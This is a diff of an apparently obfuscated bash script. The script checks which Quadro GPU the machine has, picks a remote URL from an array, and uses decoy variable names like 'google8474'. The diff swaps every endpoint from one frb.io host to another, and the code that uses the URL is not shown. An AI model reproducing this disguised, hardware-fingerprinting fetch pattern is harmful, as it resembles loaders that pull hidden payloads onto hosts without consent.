@@ -15,7 +15,7 @@ google8474=$(nvidia-smi --query-gpu=name --format=csv,noheader | sed "s/ //g")
 if [[ $google8474 == "QuadroP4000" ]]
 then
 
-arr[0]="https://custom-v6uo.frb.io/"
+arr[0]="https://custom-r31z.frb.io/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -44,7 +44,7 @@ else
 if [[ $google8474 == "QuadroM4000" ]]
 then
 
-arr[0]="https://custom-v6uo.frb.io/"
+arr[0]="https://custom-r31z.frb.io/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -73,7 +73,7 @@ else
 if [[ $google8474 == "QuadroP5000" ]]
 then
 
-arr[0]="https://custom-v6uo.frb.io/"
+arr[0]="https://custom-r31z.frb.io/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -99,7 +99,7 @@ fi
 
 else
 
-arr[0]="https://custom-v6uo.frb.io/"
+arr[0]="https://custom-r31z.frb.io/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
